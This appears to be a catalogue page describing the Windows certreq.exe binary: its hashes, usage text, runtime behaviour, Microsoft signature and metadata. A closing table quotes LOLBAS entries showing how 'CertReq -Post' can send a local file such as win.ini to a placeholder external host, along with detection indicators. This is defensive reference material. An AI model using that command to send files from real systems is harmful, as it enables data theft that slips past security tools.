---
title: certreq.exe | CertReq.exe
excerpt: What is certreq.exe?
---

# certreq.exe 

* File Path: `C:\WINDOWS\system32\certreq.exe`
* Description: CertReq.exe

## Screenshot

![certreq.exe](screenshots/certreq.exe-81C07107AB05BD4C4AE1B7D889BCD4FE-2.png)

## Hashes

Type | Hash
-- | --
MD5 | `857B5F55C95163E56D23BF65C0300365`
SHA1 | `CE2DC0B0B5566F343E23189F7400060918239D64`
SHA256 | `9AC6382C2C19250B6103DD6E917A4821EC9FBA3EA7BB85584A09F68FBAC2CB80`
SHA384 | `37A49E196105C1DF502FB3EC63C100DEFD69CC879717DDDE76DA4F4E1BF011218B13E53740F6B8AFF67B3CDB99E40053`
SHA512 | `FA7D9CBE7292C71581DE9D01A5C73D79B86B093EEC5F79E958B98EDC8736AF70AE6BDB0A043D7FE3F6F84D070501A92AC8F6207A3BD3831A4E77BBDE12176E23`
SSDEEP | `12288:v5AXwcTs0AsYV33j1gObC5EsN7gLMoKpnyAKLGkfCqgnWDEl:v5AXwcTs0AsYV33j1gCC5EsN7gLMomsl`
IMP | `B2AE6867FF682C6BE914D0A98EE5DF16`
PESHA1 | `EA29E23755C6E8EA940ED653E8E8F33204031E56`
PE256 | `31FE10DDB05E3906C8738E7352FCDED49DE2F98D549C756B88706BB2C912EB6F`

## Runtime Data

### Usage (stdout):
```cmhg
Usage:
  CertReq -?
  CertReq [-v] -?
  CertReq [-Command] -?

  CertReq [-Submit] [Options] [RequestFileIn [CertFileOut [CertChainFileOut [FullResponseFileOut]]]]
    Submit a request to a Certification Authority.

  Options:
    -attrib AttributeString
    -binary
    -PolicyServer PolicyServer
    -config ConfigString
    -Anonymous
    -Kerberos
    -ClientCertificate ClientCertId
    -UserName UserName
    -p Password
    -crl
    -rpc
    -AdminForceMachine
    -RenewOnBehalfOf
    -NoChallenge

  CertReq -Retrieve [Options] RequestId [CertFileOut [CertChainFileOut [FullResponseFileOut]]]
    Retrieve a response to a previous request from a Certification Authority.

  Options:
    -binary
    -PolicyServer PolicyServer
    -config ConfigString
    -Anonymous
    -Kerberos
    -ClientCertificate ClientCertId
    -UserName UserName
    -p Password
    -crl
    -rpc
    -AdminForceMachine

  CertReq -New [Options] [PolicyFileIn [RequestFileOut]]
    Create a new request as directed by PolicyFileIn

  Options:
    -attrib AttributeString
    -binary
    -cert CertId
    -PolicyServer PolicyServer
    -config ConfigString
    -Anonymous
    -Kerberos
    -ClientCertificate ClientCertId
    -UserName UserName
    -p Password
    -pin Pin
    -user
    -machine
    -xchg ExchangeCertFile

  CertReq -Accept [Options] [CertChainFileIn | FullResponseFileIn | CertFileIn]
    Accept and install a response to a previous new request.

  Options:
    -user 
    -machine 
    -pin Pin

  CertReq -Policy [Options] [RequestFileIn [PolicyFileIn [RequestFileOut [PKCS10FileOut]]]]
    Construct a cross certification or qualified subordination request
    from an existing CA certificate or from an existing request.

  Options:
    -attrib AttributeString
    -binary
    -cert CertId
    -PolicyServer PolicyServer
    -Anonymous
    -Kerberos
    -ClientCertificate ClientCertId
    -UserName UserName
    -p Password
    -pin Pin
    -noEKU
    -AlternateSignatureAlgorithm
    -HashAlgorithm HashAlgorithm

  CertReq -Sign [Options] [RequestFileIn [RequestFileOut]]
    Sign a certificate request with an enrollment agent or qualified
    subordination signing certificate.

  Options:
    -binary
    -cert CertId
    -PolicyServer PolicyServer
    -Anonymous
    -Kerberos
    -ClientCertificate ClientCertId
    -UserName UserName
    -p Password
    -pin Pin
    -crl
    -noEKU
    -HashAlgorithm HashAlgorithm

  CertReq -Enroll [Options] TemplateName
  CertReq -Enroll -cert CertId [Options] Renew [ReuseKeys]
    Enroll for or renew a certificate.

  Options:
    -PolicyServer PolicyServer
    -user 
    -machine 
    -pin Pin

  CertReq -EnrollAIK [Options] [KeyContainerName]
    Enroll for AIK certificate.

  Options:
    -config

  CertReq -EnrollCredGuardCert [Options] TemplateName [ExtensionInfFile]
    Enroll for machine account Credential Guard certificate.

  Options:
    -config

  CertReq -EnrollLogon [Options]
    Enroll for Hello for Business Logon certificate via ADFS.

  Options:
    -q

  CertReq -Post [Options]
    POST an http request.

  Options:
    -attrib AttributeString
    -config URL

Unknown argument: --help

```

### Child Processes:
conhost.exe

### Window Title:
Certificate Request Processor

### Open Handles:

Path | Type
-- | --
(R-D)   C:\Windows\Fonts\StaticCache.dat | File
(R-D)   C:\Windows\System32\en-US\certreq.exe.mui | File
(R-D)   C:\Windows\System32\en-US\KernelBase.dll.mui | File
(RW-)   C:\Windows\System32 | File
\BaseNamedObjects\C:\*ProgramData\*Microsoft\*Windows\*Caches\*{6AF0698E-D558-4F6E-9B3C-3716689AF493}.2.ver0x0000000000000001.db | Section
\BaseNamedObjects\C:\*ProgramData\*Microsoft\*Windows\*Caches\*{DDF571F2-BE98-426D-8288-1A9A39C3FDA2}.2.ver0x0000000000000001.db | Section
\BaseNamedObjects\C:\*ProgramData\*Microsoft\*Windows\*Caches\*cversions.2.ro | Section
\Sessions\2\BaseNamedObjects\NLS_CodePage_1252_3_2_0_0 | Section
\Sessions\2\BaseNamedObjects\NLS_CodePage_437_3_2_0_0 | Section
\Sessions\2\Windows\Theme1077709572 | Section
\Windows\Theme3461253685 | Section


### Loaded Modules:

Path |
-- |
C:\WINDOWS\system32\certreq.exe |
C:\WINDOWS\System32\KERNEL32.DLL |
C:\WINDOWS\System32\KERNELBASE.dll |
C:\WINDOWS\SYSTEM32\ntdll.dll |


## Signature

* Status: Signature verified.
* Serial: `33000002ED2C45E4C145CF48440000000002ED`
* Thumbprint: `312860D2047EB81F8F58C29FF19ECDB4C634CF6A`
* Issuer: CN=Microsoft Windows Production PCA 2011, O=Microsoft Corporation, L=Redmond, S=Washington, C=US
* Subject: CN=Microsoft Windows, O=Microsoft Corporation, L=Redmond, S=Washington, C=US

## File Metadata

* Original Filename: CertReq.exe.mui
* Product Name: Microsoft Windows Operating System
* Company Name: Microsoft Corporation
* File Version: 10.0.22000.1 (WinBuild.160101.0800)
* Product Version: 10.0.22000.1
* Language: English (United States)
* Legal Copyright:  Microsoft Corporation. All rights reserved.
* Machine Type: 64-bit

## File Scan

* VirusTotal Detections: 0/73
* VirusTotal Link: https://www.virustotal.com/gui/file/9ac6382c2c19250b6103dd6e917a4821ec9fba3ea7bb85584a09f68fbac2cb80/detection


## Possible Misuse

*The following table contains possible examples of `certreq.exe` being misused. While `certreq.exe` is **not** inherently malicious, its legitimate functionality can be abused for malicious purposes.*

Source | Source File | Example | License
-- | -- | -- | --
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Certreq.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Certreq.yml) | `Name: CertReq.exe`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Certreq.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Certreq.yml) | `- Command: CertReq -Post -config https://example.org/ c:\windows\win.ini output.txt`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Certreq.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Certreq.yml) | `- Command: CertReq -Post -config https://example.org/ c:\windows\win.ini and show response in terminal`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Certreq.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Certreq.yml) | `- Path: C:\Windows\System32\certreq.exe`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Certreq.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Certreq.yml) | `- Path: C:\Windows\SysWOW64\certreq.exe`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Certreq.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Certreq.yml) | `- IOC: certreq creates new files`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Certreq.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Certreq.yml) | `- IOC: certreq makes POST requests`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Certreq.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Certreq.yml) | `- Link: https://dtm.uk/certreq`{:.highlight .language-yaml} | 



MIT License. Copyright (c) 2020-2021 Strontic.


